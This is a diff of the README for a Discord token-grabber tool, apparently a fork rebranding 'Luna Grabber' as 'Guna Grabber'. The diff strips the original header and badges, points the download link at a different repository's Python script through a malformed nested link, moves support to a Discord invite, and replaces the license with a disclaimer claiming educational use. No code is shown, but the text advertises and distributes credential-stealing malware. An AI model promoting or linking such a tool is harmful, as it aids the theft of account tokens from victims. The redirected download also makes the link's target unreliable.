@@ -1,26 +1,3 @@
-<h1 align="center">
-  Luna Token Grabber
-</h1>
-
-<div align="center">
-  <img  src="https://user-images.githubusercontent.com/99215486/175369409-b967da5b-e373-48ea-b8f5-8ed3d613df03.gif">
-  <br>
-  <img  src="https://img.shields.io/github/downloads/Smug246/Luna-Grabber/total?color=6d00c1">
-  <img  src="https://img.shields.io/github/stars/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
-  <img  src="https://img.shields.io/github/forks/Smug246/Luna-Grabber?logoColor=6d00c1">
-  <br>
-  <img  src="https://img.shields.io/github/commit-activity/w/Smug246/Luna-Grabber?color=6d00c1">
-  <img  src="https://img.shields.io/github/last-commit/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
-  <img  src="https://img.shields.io/github/license/Smug246/Luna-Grabber?color=6d00c1">
-  <br>
-  <img  src="https://img.shields.io/github/issues/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
-  <img  src="https://img.shields.io/github/issues-closed/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
-  <br>
-  <p align="center">
-  Telegram: https://t.me/lunaxsmug
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-</p>
-</div>
 
 ## Features
 
@@ -86,7 +63,7 @@
 ```
 Make sure you have Python 3.11+ installed and it is added to your path.
 ```
-### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
+### 2. [Download]([https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip](https://github.com/GunaGrab/Guna-Grabber/blob/main/Guna%20Grabber%20(2).py)) The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
@@ -145,13 +122,13 @@ Don't forget to give the project a star! Thanks again!
 5. Open a Pull Request
 
 ## Errors
-If you find an error that you cant fix and need help with you can submit an [issue](https://github.com/Smug246/Luna-Grabber/issues/) or join the [telegram](https://t.me/lunaxsmug) for support
+If you find an error that you cant fix and need help with you can submit an issue  for support at: https://discord.gg/VhxfytaNyS
 
 
 ## License
-Luna Grabber is distributed under the MIT License. See `LICENSE.md` for more information.
+Guna Grabber Is For Educational Purposes so if you use it for malicious purposes its not my fault
 
 
-## Star Graph
 
-![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)
+
+
